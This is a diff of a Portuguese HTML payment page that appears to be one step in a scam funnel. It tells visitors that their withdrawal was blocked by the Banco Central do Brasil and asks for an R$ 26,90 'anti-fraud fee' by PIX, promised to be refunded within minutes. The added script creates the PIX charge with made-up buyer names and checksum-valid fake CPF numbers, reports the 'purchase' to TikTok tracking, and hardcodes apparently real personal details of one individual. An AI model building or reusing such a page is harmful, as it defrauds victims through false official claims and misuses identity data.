@@ -1,156 +1,920 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Pagamento 3</title>
-    <link
-      rel="stylesheet"
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
-    />
-    <!-- TikTok Pixel Code Start -->
-    <script>
-      window.tikTokPixelId = "6940cb80540addb695fac48e";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-      document.head.appendChild(a);
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pagamento 3</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" />
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    window.tikTokPixelId = "6940cb80540addb695fac48e";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
+  <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="b8dd940a-6d15-41a7-93d5-1df862b9cca6">
     </script>
-    <script
-    src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
-    data-token="b8dd940a-6d15-41a7-93d5-1df862b9cca6"
->
-</script>
-    <!-- TikTok Pixel Code End -->
+  <!-- TikTok Pixel Code End -->
 
-    <style>
-      body {
-        font-family: "Inter", sans-serif;
-        margin: 0;
-        padding: 0;
-        background-color: #f4f6f9;
-        color: #333;
-        text-align: center;
-      }
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f6f9;
+      color: #333;
+      text-align: center;
+    }
 
-      header {
-        background-color: #0eab3f;
-        color: #fff;
-        padding: 1rem 0;
-      }
+    header {
+      background-color: #0eab3f;
+      color: #fff;
+      padding: 1rem 0;
+    }
 
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+
+    .content {
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 1rem;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .content img {
+      width: 100px;
+      margin: 1rem 0;
+    }
+
+    .content h2 {
+      font-size: 1.8rem;
+      color: #0eab3f;
+      margin-bottom: 1rem;
+    }
+
+    .content p {
+      line-height: 1.6;
+    }
+
+    .content .highlight {
+      font-weight: bold;
+      color: #0eab3f;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 1.5rem;
+      padding: 0.8rem 1.5rem;
+      font-size: 1rem;
+      font-weight: bold;
+      color: #fff;
+      background: #0eab3f;
+      border: none;
+      border-radius: 25px;
+      text-decoration: none;
+      transition: background 0.3s;
+    }
+
+    .button:hover {
+      background: #09912e;
+    }
+
+    footer {
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: #666;
+    }
+
+    @media (max-width: 480px) {
       header h1 {
-        margin: 0;
+        font-size: 1.2rem;
+      }
+
+      .content h2 {
         font-size: 1.5rem;
       }
 
       .content {
-        max-width: 600px;
-        margin: 2rem auto;
         padding: 1rem;
-        background: #fff;
+      }
+    }
+
+    /* Modal PIX Styles */
+    .pix-modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10005;
+      background: rgba(0, 0, 0, 0.6);
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .pix-modal-overlay.active {
+      display: flex;
+    }
+
+    .pix-modal-container {
+      position: relative;
+      z-index: 10006;
+      max-width: 500px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      padding: 30px;
+      box-sizing: border-box;
+      max-height: 90vh;
+      overflow-y: auto;
+      animation: slideUpModal 0.3s ease;
+    }
+
+    @keyframes slideUpModal {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .pix-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: transparent;
+      border: none;
+      font-size: 28px;
+      cursor: pointer;
+      color: #747378;
+      width: 36px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: background-color 0.15s ease;
+      z-index: 10;
+    }
+
+    .pix-modal-close:hover {
+      background-color: #f5f5f5;
+      color: #000;
+    }
+
+    .pix-loading {
+      text-align: center;
+      padding: 40px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pix-spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e0e0e0;
+      border-radius: 50%;
+      border-top-color: #003772;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .pix-payment-content {
+      display: none;
+    }
+
+    .pix-section-title {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: #000;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-align: center;
+    }
+
+    .pix-qrcode-container {
+      text-align: center;
+      margin: 24px 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    #pix-modal-qrcode {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      margin: 0 auto;
+    }
+
+    #pix-modal-qrcode-img {
+      max-width: 200px;
+      height: auto;
+      border-radius: 8px;
+      display: none;
+    }
+
+    .pix-copy-section {
+      margin-top: 24px;
+    }
+
+    .pix-input-group {
+      display: flex;
+      margin-bottom: 16px;
+      gap: 0;
+      width: 100%;
+    }
+
+    #pix-modal-code {
+      flex: 1;
+      padding: 12px 16px;
+      border: 1px solid #e0e0e0;
+      border-right: none;
+      border-radius: 8px 0 0 8px;
+      font-size: 13px;
+      background: #fff;
+      color: #000;
+      font-family: "Roboto Mono", monospace;
+      height: 41px;
+      box-sizing: border-box;
+    }
+
+    .pix-copy-btn {
+      background: #003772;
+      color: white;
+      border: 1px solid #003772;
+      border-left: none;
+      padding: 0 20px;
+      border-radius: 0 8px 8px 0;
+      cursor: pointer;
+      font-weight: 500;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      height: 41px;
+    }
+
+    .pix-copy-btn.copied {
+      background: #10b981;
+      border-color: #10b981;
+    }
+
+    .pix-payment-info {
+      margin-top: 24px;
+      padding: 16px;
+      background: #f5f5f5;
+      border-radius: 8px;
+    }
+
+    .pix-info-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    .pix-payment-status {
+      margin-top: 20px;
+      padding: 12px;
+      background: #f5f5f5;
+      border-radius: 8px;
+      border-left: 3px solid #007bff;
+      display: none;
+    }
+
+    .pix-status-content {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .pix-status-icon {
+      font-size: 20px;
+      color: #007bff;
+    }
+
+    .pix-error-message {
+      color: #dc2626;
+      text-align: center;
+      padding: 16px;
+      background: #fff5f5;
+      border-radius: 8px;
+      margin-top: 16px;
+      border: 1px solid #fecaca;
+      display: none;
+      font-size: 14px;
+    }
+
+    @media (max-width: 767px) {
+      .pix-modal-container {
+        padding: 20px;
+        max-height: 95vh;
+      }
+
+      .pix-input-group {
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      #pix-modal-code {
         border-radius: 8px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        border: 1px solid #e0e0e0;
+        width: 100%;
       }
 
-      .content img {
-        width: 100px;
-        margin: 1rem 0;
+      .pix-copy-btn {
+        border-radius: 8px;
+        border: 1px solid #003772;
+        padding: 12px;
+        justify-content: center;
+        width: 100%;
       }
+    }
+  </style>
+</head>
 
-      .content h2 {
-        font-size: 1.8rem;
-        color: #0eab3f;
-        margin-bottom: 1rem;
-      }
+<body>
+  <header>
+    <h1>ATENÇÃO</h1>
+  </header>
 
-      .content p {
-        line-height: 1.6;
-      }
+  <div class="content">
+    <img src="images/logo-pix-icone-1024.png" alt="Logo Pix" />
+    <h2>Saque aprovado com sucesso!</h2>
+    <p>
+      <strong>Seu saldo foi enviado</strong>, mas a transferência foi
+      interrompida pelo
+      <span class="highlight">Banco Central do Brasil</span>.
+    </p>
+    <p>
+      Para garantir a segurança e evitar fraudes, é necessário pagar uma
+      <span class="highlight">tarifa simbólica anti-fraude</span>. Este valor
+      será extornado em até <strong>2 minutos</strong> após o pagamento.
+    </p>
+    <p>
+      <strong>Valor da tarifa:</strong>
+      <span class="highlight">R$ 26,90</span>
+    </p>
+    <button onclick="abrirModalPix()" class="button">
+      Pagar Tarifa e Desbloquear Saldo
+    </button>
+  </div>
 
-      .content .highlight {
-        font-weight: bold;
-        color: #0eab3f;
-      }
+  <!-- Recursos para PIX -->
+  <script src="pagamento/js/qrcode.min.js"></script>
+  <script src="../pagamento/payment-api.js"></script>
 
-      .button {
-        display: inline-block;
-        margin-top: 1.5rem;
-        padding: 0.8rem 1.5rem;
-        font-size: 1rem;
-        font-weight: bold;
-        color: #fff;
-        background: #0eab3f;
-        border: none;
-        border-radius: 25px;
-        text-decoration: none;
-        transition: background 0.3s;
-      }
-
-      .button:hover {
-        background: #09912e;
-      }
-
-      footer {
-        margin-top: 2rem;
-        font-size: 0.9rem;
-        color: #666;
-      }
-
-      @media (max-width: 480px) {
-        header h1 {
-          font-size: 1.2rem;
-        }
-
-        .content h2 {
-          font-size: 1.5rem;
-        }
-
-        .content {
-          padding: 1rem;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <header>
-      <h1>ATENÇÃO</h1>
-    </header>
-
-    <div class="content">
-      <img src="images/logo-pix-icone-1024.png" alt="Logo Pix" />
-      <h2>Saque aprovado com sucesso!</h2>
-      <p>
-        <strong>Seu saldo foi enviado</strong>, mas a transferência foi
-        interrompida pelo
-        <span class="highlight">Banco Central do Brasil</span>.
-      </p>
-      <p>
-        Para garantir a segurança e evitar fraudes, é necessário pagar uma
-        <span class="highlight">tarifa simbólica anti-fraude</span>. Este valor
-        será extornado em até <strong>2 minutos</strong> após o pagamento.
-      </p>
-      <p>
-        <strong>Valor da tarifa:</strong>
-        <span class="highlight">R$ 26,90</span>
-      </p>
-      <button onclick="redirectToPayment()" class="button">
-        Pagar Tarifa e Desbloquear Saldo
+  <!-- Modal PIX -->
+  <div id="pix-modal-overlay" class="pix-modal-overlay">
+    <div class="pix-modal-container">
+      <button class="pix-modal-close" onclick="fecharModalPix()">
+        &times;
       </button>
+
+      <div style="text-align: center; margin-bottom: 20px; font-size: 20px; font-weight: 600; color: #000;">
+        Pagamento via PIX
+      </div>
+
+      <div id="pix-loading" class="pix-loading">
+        <div class="pix-spinner"></div>
+        <p>Gerando QRCode para pagamento...</p>
+      </div>
+
+      <div id="pix-payment-content" class="pix-payment-content">
+        <div class="pix-qrcode-container">
+          <h2 class="pix-section-title">Escaneie o QRCode abaixo</h2>
+          <div id="pix-modal-qrcode"></div>
+          <img id="pix-modal-qrcode-img" alt="QR Code PIX" />
+        </div>
+
+        <div class="pix-copy-section">
+          <h2 class="pix-section-title" style="font-size: 14px; margin-bottom: 12px">
+            Ou copie o código PIX
+          </h2>
+          <div class="pix-input-group">
+            <input type="text" id="pix-modal-code" readonly />
+            <button class="pix-copy-btn" id="pix-copy-btn">
+              <i class="far fa-copy"></i>
+              <span>Copiar</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="pix-payment-info">
+          <div class="pix-info-item">
+            <span class="pix-info-label"> Valor: </span>
+            <span id="pix-amount">R$ 0,00</span>
+          </div>
+          <div class="pix-info-item">
+            <span class="pix-info-label"> Válido até: </span>
+            <span id="pix-expiration">--/--/---- --:--</span>
+          </div>
+        </div>
+
+        <div id="pix-payment-status" class="pix-payment-status">
+          <div class="pix-status-content">
+            <div class="pix-status-icon">
+              <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <div class="pix-status-text">
+              <p class="pix-status-title">
+                Aguardando confirmação do pagamento...
+              </p>
+              <p class="pix-status-subtitle" id="pix-status-subtitle">
+                Verificando a cada 8 segundos
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="pix-error-message" class="pix-error-message"></div>
     </div>
+  </div>
 
-    <script>
-      function redirectToPayment() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const queryString = urlParams.toString();
-        window.location.href =
-          "pagamento/index.html" + (queryString ? "?" + queryString : "");
+  <script>
+    // --- Lógica do Modal PIX (Upsell 3) ---
+
+    // Variáveis globais
+    let pixTransactionId = null;
+    let pixPaymentId = null;
+    let pixCheckPaymentInterval = null;
+    let pixPollingDiretoCleanup = null;
+    let paymentConfirmed = false;
+
+    const DEFAULT_CUSTOMER = {
+      email: "fabioonofre81@gmail.com",
+      phone: "84996733457",
+      name: "Fábio Onofre de Oliveira",
+      document: "08993537461",
+    };
+
+    // Configuração específica do Upsell 3
+    function getVariantPrice() {
+      return 26.90;
+    }
+
+    const CONTENT_ID = "tiktokpay_upsell3";
+    const REDIRECT_URL = "../upsell4/index.html";
+
+    function abrirModalPix() {
+      const modal = document.getElementById("pix-modal-overlay");
+      modal.classList.add("active");
+      document.body.style.overflow = "hidden";
+
+      const pixLoading = document.getElementById("pix-loading");
+      const pixPaymentContent = document.getElementById("pix-payment-content");
+      const pixErrorMessage = document.getElementById("pix-error-message");
+      const pixPaymentStatus = document.getElementById("pix-payment-status");
+
+      pixLoading.style.display = "flex";
+      pixPaymentContent.style.display = "none";
+      pixErrorMessage.style.display = "none";
+      pixPaymentStatus.style.display = "none";
+
+      tryGeneratePix();
+    }
+
+    function fecharModalPix() {
+      const modal = document.getElementById("pix-modal-overlay");
+      modal.classList.remove("active");
+      document.body.style.overflow = "";
+
+      if (pixCheckPaymentInterval) {
+        clearInterval(pixCheckPaymentInterval);
+        pixCheckPaymentInterval = null;
       }
-    </script>
+      if (pixPollingDiretoCleanup) {
+        pixPollingDiretoCleanup();
+        pixPollingDiretoCleanup = null;
+      }
+      paymentConfirmed = false;
+    }
 
-    <footer>
-      <p>© 2024 Pagamento Seguro. Todos os direitos reservados.</p>
-    </footer>
-  </body>
+    document.addEventListener("DOMContentLoaded", function () {
+      const overlay = document.getElementById("pix-modal-overlay");
+      if (overlay) {
+        overlay.addEventListener("click", function (e) {
+          if (e.target === overlay) {
+            fecharModalPix();
+          }
+        });
+      }
+
+      // Salvar UTMs no load
+      getUtmParams();
+    });
+
+    function getUtmParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = {};
+      const utmFields = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "click_id", "fbclid", "gclid", "msclkid", "ttclid"];
+
+      utmFields.forEach((param) => {
+        if (urlParams.has(param)) {
+          utmParams[param] = urlParams.get(param);
+        }
+      });
+
+      if (Object.keys(utmParams).length > 0) {
+        try {
+          localStorage.setItem("utm_params", JSON.stringify(utmParams));
+        } catch (e) { console.warn("Erro localStorage UTM:", e); }
+      }
+      return utmParams;
+    }
+
+    function gerarCPF() {
+      let cpf = "";
+      for (let i = 0; i < 9; i++) cpf += Math.floor(Math.random() * 10);
+      let soma = 0;
+      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+      let resto = 11 - (soma % 11);
+      let dv1 = resto > 9 ? 0 : resto;
+      cpf += dv1;
+      soma = 0;
+      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+      resto = 11 - (soma % 11);
+      let dv2 = resto > 9 ? 0 : resto;
+      cpf += dv2;
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function gerarNome() {
+      const nomes = ["Joao", "Maria", "Pedro", "Ana", "Carlos", "Mariana", "Lucas", "Juliana", "Fernando", "Patricia"];
+      const sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Gomes", "Martins"];
+      const nome = nomes[Math.floor(Math.random() * nomes.length)];
+      const sobrenome1 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      const sobrenome2 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      return `${nome} ${sobrenome1} ${sobrenome2}`;
+    }
+
+    function gerarEmail(nome) {
+      const provedores = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "icloud.com"];
+      const nomeFormatado = nome.toLowerCase().replace(/\s+/g, ".");
+      const provedor = provedores[Math.floor(Math.random() * provedores.length)];
+      return `${nomeFormatado}@${provedor}`;
+    }
+
+    function gerarTelefone() {
+      const ddd = ["11", "21", "31", "41", "51", "61", "71", "81", "91"];
+      const num = Math.floor(10000000 + Math.random() * 90000000);
+      return `${ddd[Math.floor(Math.random() * ddd.length)]}9${num.toString().substring(1)}`;
+    }
+
+    function getClienteData() {
+      let clienteNome = null;
+      let clienteEmail = null;
+      let clienteDocumento = null;
+      try {
+        const storedData = localStorage.getItem("userPixData");
+        if (storedData) {
+          const formData = JSON.parse(storedData);
+          clienteNome = formData.nome || null;
+          if (formData.tipoChave === "CPF" && formData.chavePix) {
+            clienteDocumento = formData.chavePix.replace(/\D/g, "");
+          }
+        }
+      } catch (e) { console.error(e); }
+
+      if (!clienteNome) clienteNome = gerarNome();
+      if (!clienteEmail) clienteEmail = gerarEmail(clienteNome);
+      if (!clienteDocumento) clienteDocumento = gerarCPF().replace(/\D/g, "");
+      const clienteTelefone = gerarTelefone();
+
+      return { nome: clienteNome, email: clienteEmail, documento: clienteDocumento, telefone: clienteTelefone };
+    }
+
+    function verificarPagamento(idTransacao) {
+      if (typeof window.verifyPayment === "function") {
+        return window.verifyPayment(idTransacao, pixPaymentId);
+      }
+      return fetch("/api/verifyPayment", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: idTransacao }),
+      }).then((response) => {
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        return response.json();
+      });
+    }
+
+    function verificarPagamentoDiretoAPI(transactionId) {
+      const apiUrl = `https://www.pagamentos-seguros.app/api-pix/v6KgN0fD7krYXynlSCgAOVyL1LFV_N-axdxDNtvY626czr8yjHKj05_OZMamtVVm0oLc_C5rCLNd85U_UkXREQ?transactionId=${encodeURIComponent(transactionId)}`;
+      return fetch(apiUrl, {
+        method: "GET",
+        headers: { "Content-Type": "application/json" },
+      })
+        .then((response) => {
+          if (response.status === 404) return { status: "PENDING" };
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          return response.json();
+        })
+        .then((data) => {
+          const status = data.status ? data.status.toUpperCase() : "PENDING";
+          const isPaid = status === "COMPLETED";
+          return { paid: isPaid, status: status.toLowerCase(), transactionId: data.transactionId || transactionId, amount: data.amount || null, data: data };
+        })
+        .catch((error) => {
+          console.error("❌ [Polling Direto] Erro:", error);
+          return { paid: false, status: "pending", error: error.message };
+        });
+    }
+
+    function iniciarPollingDiretoAPI(transactionId) {
+      const startTime = Date.now();
+      let currentTimeout = null;
+      function fazerPolling() {
+        if (paymentConfirmed) return;
+        const elapsed = (Date.now() - startTime) / 1000;
+        let intervalo = 2000;
+        if (elapsed > 30) intervalo = 5000;
+        if (elapsed > 120) intervalo = 10000;
+        if (elapsed > 300) intervalo = 30000;
+
+        verificarPagamentoDiretoAPI(transactionId).then((data) => {
+          if (data.paid === true || isPaymentPaid(data)) {
+            handlePaymentConfirmed(transactionId, "Polling Direto (API)");
+            return;
+          }
+          if (!paymentConfirmed) currentTimeout = setTimeout(fazerPolling, intervalo);
+        }).catch(() => {
+          if (!paymentConfirmed) currentTimeout = setTimeout(fazerPolling, intervalo);
+        });
+      }
+      fazerPolling();
+      return () => { if (currentTimeout) clearTimeout(currentTimeout); };
+    }
+
+    function isPaymentPaid(data) {
+      return (data.paid === true || ["completed", "paid", "approved", "confirmado", "pago"].includes((data.status || "").toLowerCase()));
+    }
+
+    function updatePaymentStatus(data, statusSubtitle) {
+      if (!statusSubtitle) return;
+      const now = new Date().toLocaleTimeString("pt-BR");
+      if (isPaymentPaid(data)) {
+        statusSubtitle.textContent = `✅ Pagamento confirmado! Redirecionando...`;
+        statusSubtitle.style.color = "#28a745";
+      } else {
+        statusSubtitle.textContent = `Última verificação: ${now} - Status: ${data.status || "pendente"}`;
+      }
+    }
+
+    function iniciarVerificacaoPagamento(idTransacao) {
+      paymentConfirmed = false;
+      const statusElement = document.getElementById("pix-payment-status");
+      const statusSubtitle = document.getElementById("pix-status-subtitle");
+      if (statusElement) statusElement.style.display = "block";
+
+      verificarPagamento(idTransacao).then((data) => {
+        updatePaymentStatus(data, statusSubtitle);
+        if (isPaymentPaid(data)) {
+          handlePaymentConfirmed(idTransacao, "Polling Local");
+          return;
+        }
+        pixCheckPaymentInterval = setInterval(() => {
+          if (paymentConfirmed) { clearInterval(pixCheckPaymentInterval); return; }
+          verificarPagamento(idTransacao).then((d) => {
+            updatePaymentStatus(d, statusSubtitle);
+            if (isPaymentPaid(d)) {
+              clearInterval(pixCheckPaymentInterval);
+              handlePaymentConfirmed(idTransacao, "Polling Local");
+            }
+          }).catch(console.error);
+        }, 8000);
+      }).catch((e) => {
+        console.error(e);
+        // retry setup
+        pixCheckPaymentInterval = setInterval(() => {
+          if (paymentConfirmed) { clearInterval(pixCheckPaymentInterval); return; }
+          verificarPagamento(idTransacao).then((d) => {
+            updatePaymentStatus(d, statusSubtitle);
+            if (isPaymentPaid(d)) {
+              clearInterval(pixCheckPaymentInterval);
+              handlePaymentConfirmed(idTransacao, "Polling Local");
+            }
+          }).catch(console.error);
+        }, 8000);
+      });
+
+      pixPollingDiretoCleanup = iniciarPollingDiretoAPI(idTransacao);
+    }
+
+    async function handlePaymentConfirmed(idTransacao, origem = "Desconhecido") {
+      if (paymentConfirmed) return;
+      paymentConfirmed = true;
+
+      console.log(`🎉 PAGAMENTO CONFIRMADO POR: ${origem}`);
+      if (pixCheckPaymentInterval) { clearInterval(pixCheckPaymentInterval); pixCheckPaymentInterval = null; }
+      if (pixPollingDiretoCleanup) { pixPollingDiretoCleanup(); pixPollingDiretoCleanup = null; }
+
+      const statusElement = document.getElementById("pix-payment-status");
+      if (statusElement) {
+        statusElement.innerHTML = `
+                  <div class="pix-status-content">
+                      <div class="pix-status-icon" style="color: #28a745;">
+                          <i class="fas fa-check-circle"></i>
+                      </div>
+                      <div class="pix-status-text">
+                          <p class="pix-status-title" style="color: #28a745;">Pagamento confirmado!</p>
+                          <p class="pix-status-subtitle">Redirecionando...</p>
+                      </div>
+                  </div>
+              `;
+      }
+
+      const cliente = getClienteData();
+      const valor = getVariantPrice();
+
+      if (typeof window.trackTikTokPurchase === "function") {
+        window.trackTikTokPurchase({
+          transactionId: idTransacao,
+          amount: valor,
+          customer: {
+            email: cliente.email || DEFAULT_CUSTOMER.email,
+            phone: cliente.telefone || DEFAULT_CUSTOMER.phone,
+            name: cliente.nome || DEFAULT_CUSTOMER.name,
+            document: cliente.documento || DEFAULT_CUSTOMER.document,
+          },
+          contentId: CONTENT_ID,
+        });
+      }
+
+      const utmParams = getUtmParams();
+      const utmString = new URLSearchParams(utmParams).toString();
+      const redirectUrl = REDIRECT_URL + (utmString ? "?" + utmString : "");
+
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 2000);
+    }
+
+    function showError(message) {
+      document.getElementById("pix-loading").style.display = "none";
+      const errorElement = document.getElementById("pix-error-message");
+      errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+      errorElement.style.display = "block";
+    }
+
+    function tryGeneratePix(retryCount = 0) {
+      const cliente = getClienteData();
+      const valor = getVariantPrice();
+      const utmParams = getUtmParams();
+      const utmString = new URLSearchParams(utmParams).toString();
+
+      const paymentData = {
+        amount: Math.round(valor * 100),
+        description: "Tarifa simbólica anti-fraude",
+        customer: {
+          name: cliente.nome,
+          document: cliente.documento,
+          email: cliente.email,
+          phone: cliente.telefone,
+        },
+        item: {
+          title: "Tarifa simbólica anti-fraude",
+          price: Math.round(valor * 100),
+          quantity: 1,
+        },
+        paymentMethod: "PIX",
+        utm: utmString,
+      };
+
+      fetch("https://www.pagamentos-seguros.app/api-pix/v6KgN0fD7krYXynlSCgAOVyL1LFV_N-axdxDNtvY626czr8yjHKj05_OZMamtVVm0oLc_C5rCLNd85U_UkXREQ", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(paymentData),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.pixCode && data.transactionId) {
+            handlePixSuccess(data);
+          } else {
+            showError(data.message || "Erro ao gerar o PIX.");
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+          showError("Erro ao gerar o PIX.");
+        });
+    }
+
+    function handlePixSuccess(data) {
+      pixTransactionId = data.transactionId;
+
+      if (pixTransactionId) {
+        const utmParams = getUtmParams();
+        fetch("/api/save-utm-query", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ transactionId: pixTransactionId, utmQuery: JSON.stringify(utmParams) }),
+        }).catch(console.error);
+      }
+
+      const pixLoading = document.getElementById("pix-loading");
+      const pixPaymentContent = document.getElementById("pix-payment-content");
+      const pixAmount = document.getElementById("pix-amount");
+      const pixExpiration = document.getElementById("pix-expiration");
+      const pixModalCode = document.getElementById("pix-modal-code");
+      const qrcodeImg = document.getElementById("pix-modal-qrcode-img");
+      const qrcodeElement = document.getElementById("pix-modal-qrcode");
+
+      pixLoading.style.display = "none";
+      pixPaymentContent.style.display = "block";
+
+      const valor = getVariantPrice();
+      pixAmount.textContent = valor.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+
+      const expirationDate = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
+      pixExpiration.textContent = expirationDate.toLocaleString("pt-BR");
+
+      const pixQrCode = data.pixCode || "";
+      pixModalCode.value = pixQrCode;
+
+      if (pixQrCode && pixQrCode.startsWith("data:image")) {
+        qrcodeImg.src = pixQrCode;
+        qrcodeImg.style.display = "block";
+        qrcodeElement.style.display = "none";
+      } else if (pixQrCode && typeof QRCode !== "undefined") {
+        qrcodeElement.innerHTML = "";
+        QRCode.toCanvas(qrcodeElement, pixQrCode, { width: 200, margin: 2, color: { dark: "#FE4908", light: "#ffffff" } }, function (error) {
+          if (error) {
+            qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(pixQrCode)}&size=200`;
+            qrcodeImg.style.display = "block";
+            qrcodeElement.style.display = "none";
+          }
+        });
+      } else {
+        qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(pixQrCode)}&size=200`;
+        qrcodeImg.style.display = "block";
+        qrcodeElement.style.display = "none";
+      }
+
+      const copyBtn = document.getElementById("pix-copy-btn");
+      const newCopyBtn = copyBtn.cloneNode(true);
+      copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
+      newCopyBtn.addEventListener("click", function () {
+        pixModalCode.select();
+        document.execCommand("copy");
+        newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+        setTimeout(() => { newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>'; }, 2000);
+      });
+
+      if (pixTransactionId) {
+        iniciarVerificacaoPagamento(pixTransactionId);
+
+        // Track InitiateCheckout
+        if (typeof window.trackTikTokInitiateCheckout === "function") {
+          const cliente = getClienteData();
+          window.trackTikTokInitiateCheckout({
+            transactionId: pixTransactionId,
+            amount: valor,
+            customer: {
+              email: cliente.email || DEFAULT_CUSTOMER.email,
+              phone: cliente.telefone || DEFAULT_CUSTOMER.phone,
+              name: cliente.nome || DEFAULT_CUSTOMER.name,
+              document: cliente.documento || DEFAULT_CUSTOMER.document,
+            },
+            contentId: CONTENT_ID,
+          });
+        }
+      }
+    }
+  </script>
+
+  <footer>
+    <p>© 2024 Pagamento Seguro. Todos os direitos reservados.</p>
+  </footer>
+</body>
+
 </html>
